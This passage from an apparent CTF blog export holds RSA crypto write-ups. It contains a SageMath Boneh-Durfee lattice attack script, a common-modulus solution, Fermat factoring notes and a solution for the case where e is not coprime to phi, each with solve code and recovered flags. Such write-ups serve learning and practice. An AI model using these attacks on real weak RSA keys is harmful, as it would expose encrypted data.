+ <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27</span>    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bb</span></span><br><span class="line">    c = <span class="number">0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866c</span></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">0.270</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = <span class="built_in">int</span>((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of e:&quot;</span>, <span class="built_in">int</span>(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of N:&quot;</span>, <span class="built_in">int</span>(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[+] d:&quot;</span> + <span class="built_in">str</span>(d))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[+] m:&quot;</span> + <span class="built_in">str</span>(m))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== no solution was found ===&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== ALL DONE!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure>
<h1>Addiction</h1>
<p>When we obtain the $m$, there are different ways to get <code>flag</code>.</p>
<ul>
<li>long_to_bytes()</li>
</ul>
<p>Long integer converts to bytes.</p>
<ul>
<li>ASCII</li>
</ul>
<p>The beginning of $m$ is <code>1</code>, and it may convert to some invisible characters.</p>
<p><strong>TBC</strong></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>factor</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-07-2022CnHoneKe</title>
    <url>/2022/12/07/22-12-07-2022CnHoneKe/</url>
    <content><![CDATA[<p>The competition was held in August.</p>
<p>The exercises except <code>factor2</code> are done. And the article is mainly aim to make a record for myself. The <code>Modus</code> is about the multiplicative homomorphic system, which is similar to the <code>Extended Euclidean algorithm</code>.</p>
<p><strong>List</strong></p>
<ul>
<li>[x] Modus</li>
<li>[x] rsa</li>
<li>[ ] factor2</li>
<li>[x] secret_data</li>
</ul>
<p>Wish I can solve out above.</p>
<span id="more"></span><!--toc-->
<h1>Modus</h1>
<ul>
<li>multiplicative_homomorphic</li>
</ul>
<p><strong>output.txt</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">14142010206099386143235977555692857399310494373372334255226213043954222671886219214790080363755519983589419573494262932031062165425660149023699589427423291076757673539031113758789961660789969074666728548356143546954548237178966812807683542026090314756465049840269239582841323515153189937744280883895942616355068450477244038093783025761830910527817275117470273068582606801561816182028771714266926279491448124072638544823523354972471012076902504991756879694948477398253632905720027515230565063830199860044535605314432273647912553716877788661706091962626029470938285869557993283863813783012548154763397158585969860496209</span></span><br><span class="line">e1 = <span class="number">8044170206501208651566242545498471362911890649958881015968520025930186294576023443506808099677296038797758573489705294289102108150592764180571398770862282775413964383616485564171756065468610971753771700993772575426420613330938626182989999507422559869431997096499661057456703567386749182728255894961711</span></span><br><span class="line">c1 = <span class="number">11517322714245526592044873592382373283428914348422645739336159016405003731268657488015847458779166523731678788259036486197351408324218938844963108776390284845014868126098529982171539875948326597563481747612010865265679909207769244324752454968172401384300433252342047155447253514663020084257315172025978213587941036806257025876560069777775117798912056950800470305039358493009376541529192357082470617915062674822440632959240104574498373020678875137349967659371746447815516349204225897744273956308472359601558104152900628002351072193856499370256139818744736463310402972428459727204523498170929275318085749369313370330104</span></span><br><span class="line">e2 = <span class="number">7981110843177277522743262582712207767500318326009118362192817529414323700650435360291001887232564132664914694220334201133850645107707193720930288877874115700468049318771691746592219604611120450612600603061311788240065247605723819417162805390035814213048743243801428908542140081097421519822132590047533</span></span><br><span class="line">c2 = <span class="number">12907231513900923422005862146378905589636791955213455533815625546155661275692081099543894853443339737652933422555561840945917851059973294781475696342510739464313686827430856742266071924616860913810640580296234473777303348248031669837803543965896443694327322478656672147536068477193332582821244877632320706358476947499828283809012293724747791713411303065091158644428874828519807586496004634361827049528190857803358038226873772036022804215684911051370929474550764142943510840488678370689581686370179457811111602201500802245275266633124851078915997894235280935026230159846619929979668248511374747926732890795947582868735</span></span><br><span class="line">e3 = <span class="number">8321945773137532897701269832287423438330975369722946793416731752574708023263908693097168458920645511451157398450278461406044452962800707032660103849647429968263806321843635237930345258217128805872313308435747131438472827261934005675575066641207582827978944766548998867180054428477087525524476746729443</span></span><br><span class="line">c3 = <span class="number">14065425026445215199826296511184881258323064633386950509660192854866326626040354040592178906620984652169865998063876885421774133239148395916412178848784041317916589243316140373118461629430419305769180856968279675982734449182890302977853892881391084830333333875116598959777525928574769839174695101654696531535920235825780434207646161363349309470260223615977113109458426965856166705879375711518022880712089324008258280991081209228374850515248942548172463741894540420262751207821783524890116559086561517224038086473047623408064157594299815732082781632190258405091440187576055868450259807171733509904666142689629066721239</span></span><br></pre></td></tr></table></figure>
<p><strong>Analyse</strong></p>
<p>When I see the <code>output.txt</code>, the first thing appeared in my mind is the <code>SameModAttack</code>, using the <code>Extended-Extended Euclidean algorithm</code>. :)</p>
<p>Obviously it is wrong, and the correct solution is to use the <code>multiplicative homomorphic properties</code>.</p>
<p>From the <code>output</code>, we can get a condition that <code>gcd(e1, e2, e3) = 1</code>. Using the <code>Extended Euclidean algorithm</code> we can get $gcdext(a, b) \Longrightarrow gcd(a, b) = r * a + s * b$.</p>
<p>By deduction, we will get the relation that:<br>
$$<br>
gcd(e1, e2) \equiv e1 * r1 + e2 * s1<br>
$$</p>
<p>$$<br>
gcd(gcd(e1, e2), e3) \equiv gcd(e1, e2) * r2 + e3 * s2<br>
$$</p>
<p>$$<br>
\Longrightarrow 1 \equiv (e1 * r1 + e2 * s1) * r2 + e3 * s2<br>
$$</p>
<p>Using this important equation, we can deduce the plaintext:<br>
$$<br>
c1^{r1 \cdot r2} * c2^{r2 \cdot s1} * c3^{s3} \mod n<br>
$$</p>
<p>$$<br>
\Longrightarrow m^{e1\cdot r1 \cdot r2 + e2 \cdot r2 \cdot s1 + e3 \cdot s2} \equiv m \mod n<br>
$$</p>
<p>And we can solve out the important <code>m</code>.</p>
<p><strong><a href="http://exp.py">exp.py</a></strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">g1, r1, s1 = gcdext(e1, e2)</span><br><span class="line">g2, r2, s2 = gcdext(g1, e3)</span><br><span class="line"><span class="built_in">print</span>(g2)</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">m = powmod(c1, r1*r2, n)*powmod(c2, r2*s1, n)*powmod(c3, s2, n) % n</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 158364088221424626103916028957988006099747465255174624548375855659785449250446255975244653061928080738353296765</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment"># CnHongKe&#123;e4d0e72e-7589-46a5-973a-cb2a561ab9b5&#125;</span></span><br></pre></td></tr></table></figure>
<h1>rsa</h1>
<ul>
<li>Euler function 2</li>
<li>fermat factor</li>
</ul>
<p><strong><a href="http://task.py">task.py</a></strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p1 = getPrime(<span class="number">256</span>)</span><br><span class="line">p2 = gmpy2.next_prime(p1)</span><br><span class="line">q1 = getPrime(<span class="number">256</span>)</span><br><span class="line">q2 = gmpy2.next_prime(q1)</span><br><span class="line">n = p1 * p2 * q1 * q2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n = %s&quot;</span> % <span class="built_in">str</span>(n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;c = %s&quot;</span> % <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 64167976067579049714960625453369319623574147507612434283986049223337768780480307767872484679214997588434480836733456745370562072077109044069294552424055163225824033286416753073591864962033181307822913035174676405849974928866646899569297852568167037383571518655075260561571463850326020102574832776970253538663</span></span><br><span class="line"><span class="comment"># c = 61862798948167945139222097835309318688214053098609025632041946354708220281670731577734398373186075525909035569024535800893559811995294302363408878574730352951360726686941143742759917076156204564133401228995322937563878389120770732315714920284214472911769619065607001763986611359218449802649142381309774537696</span></span><br></pre></td></tr></table></figure>
<p><strong>Analyse</strong></p>
<p>From the code, we can make a conclusion that the <code>p1</code> and <code>p2</code> are primes which are neighbors, and the <code>q1</code> and <code>q2</code> are the same.</p>
<p>At this time, we can use <code>fermat factor</code> to solve out the different <code>p1</code>, <code>p2</code>, <code>q1</code> and <code>q2</code>.</p>
<p>The <code>n</code>  is <code>Composite number</code> , so we will use <code>Euler function 2</code> to solve out $\varphi(n)$.</p>
<p>We use <code>fermat factor</code> to make a possible list and make sure that the <code>n = p1 * p2 * q1 * q2</code></p>
<h1>factor2</h1>
<h1>secret_data</h1>
<ul>
<li>change and fix the data</li>
<li>convert data to zip</li>
<li>zip to xlsx</li>
<li>kali-grep to find the flag</li>
</ul>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>cnhongke</tag>
        <tag>multiplicative_homomorphic</tag>
        <tag>euclidean</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-16-YD</title>
    <url>/2022/11/16/22-11-16-YD/</url>
    <content><![CDATA[<p>1115-YD-GAME.</p>
<p>Write Up about <strong>crypto</strong> and <strong>misc</strong>.</p>
<p>AK the crypto~</p>
<span id="more"></span><!--toc-->
<h1>rrrrsa</h1>
<ul>
<li>Euler’s totient function</li>
<li>$e$ and $phi$ are not relatively-prime</li>
</ul>
<h2 id="Euler’s-totient-function">Euler’s totient function</h2>
<p>Mainly use the Euler 3, which has the equation that:<br>
$$<br>
\varphi(p^{k}\cdot q^{r}) = \varphi(p^{k})\cdot \varphi(q^{r})<br>
$$</p>
<p>$$<br>
\Longrightarrow \varphi§ \times p^{k-1} \times \varphi(q) \times q^{r-1}<br>
$$</p>
<p>$$<br>
\Longrightarrow (p-1)\times p^{k-1} \times (q-1)\times q^{r-1}<br>
$$</p>
<h2 id="Main">Main</h2>
<p><code>task.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">256</span>)</span><br><span class="line">q=getPrime(<span class="number">256</span>)</span><br><span class="line">r=getPrime(<span class="number">256</span>)</span><br><span class="line">s=getPrime(<span class="number">256</span>)</span><br><span class="line">n=p**<span class="number">2</span>*q**<span class="number">3</span>*r**<span class="number">4</span>*s**<span class="number">5</span></span><br><span class="line">e=<span class="number">14</span></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(p,q,r,s,c,sep=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
<p><code>exp.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">82740843489176005842917905237448676902781319326096412115804401131397466993701</span></span><br><span class="line">q=<span class="number">85263643568597752465513069151877689268453731648228759206805083081972094635829</span></span><br><span class="line">r=<span class="number">79374890087283111247783732293463483039814224158289962524595401321277418666013</span></span><br><span class="line">s=<span class="number">102732199362754952069273055525350226201958416532282326662545431277468292741447</span></span><br><span class="line">c=<span class="number">209764158198100932214155089968863460960764115788843889450050526143389381127082813487813848764081174468416915862387829518066498286649325136938861327501126507330636283194491774843852097326223633337209701533553768182215060190222820102775941550334063704345167980872865539263669078518722589070762176421658193780663489275300987379291331254855029837613791180120722762611589441493216729829935815928668091245317003984177304991150484204972754604505926951762889894890977781284204135659968910559636276248002638001257927724627172934291321960032984200304503486457400466222152687435733385861015747679424548570249193669289227091923991244140876236848584520997920469772887694030202115298206597699720631193271607873611648764756487112169968220121850963271008810056644983219771177431102811348959976986368053544506721049809904407594329574573889027703243130484608315308768672733480521699846869769824733283356920305979098527936478174996930553057717113709689343835430493021845720498504798696915665856537146177480318328251379204246844497037689723120344053581795715706628542369652261282102647414868089</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = p**<span class="number">2</span>*q**<span class="number">3</span>*r**<span class="number">4</span>*s**<span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">N = (p-<span class="number">1</span>)*p**(<span class="number">2</span>-<span class="number">1</span>) * (q-<span class="number">1</span>)*q**(<span class="number">3</span>-<span class="number">1</span>) * (r-<span class="number">1</span>)*r**(<span class="number">4</span>-<span class="number">1</span>) * (s-<span class="number">1</span>)*s**(<span class="number">5</span>-<span class="number">1</span>) <span class="comment"># key 1</span></span><br><span class="line">e = <span class="number">14</span></span><br><span class="line">d = invert(e//<span class="number">2</span>, N) <span class="comment"># key2-1</span></span><br><span class="line">m = iroot(powmod(c, d, n), <span class="number">2</span>)[<span class="number">0</span>] <span class="comment"># key2-2</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># 46327402297749589082353363703523801418931778189802600046922737992686461676413</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;YqcbT7kcyeciLpEE3YQuRsLzJk&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1>ASR</h1>
<blockquote>
<p>Reference: [CryptoCTF2022]PolyRSA</p>
</blockquote>
<ul>
<li>Polynomial solving</li>
</ul>
<p><code>task.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genprime</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		r = getRandomNBitInteger(<span class="number">64</span>)</span><br><span class="line">		p = r**<span class="number">6</span> + <span class="number">8</span>*r**<span class="number">4</span> - <span class="number">41</span>*r**<span class="number">3</span> + <span class="number">14</span>*r**<span class="number">2</span> - <span class="number">116</span>*r + <span class="number">31387</span></span><br><span class="line">		q = r**<span class="number">5</span> - <span class="number">9</span>*r**<span class="number">4</span> + <span class="number">17</span>*r**<span class="number">3</span> - <span class="number">311</span>*r**<span class="number">2</span> - <span class="number">16</span>*r + <span class="number">14029</span></span><br><span class="line">		<span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">			<span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">flag, n</span>):</span><br><span class="line">	m = bytes_to_long(flag)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">pow</span>(m, <span class="number">31337</span>, n)</span><br><span class="line"></span><br><span class="line">p, q = genprime()</span><br><span class="line">n = p * q</span><br><span class="line">c = enc(flag, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>
<p><code>exp.py</code></p>
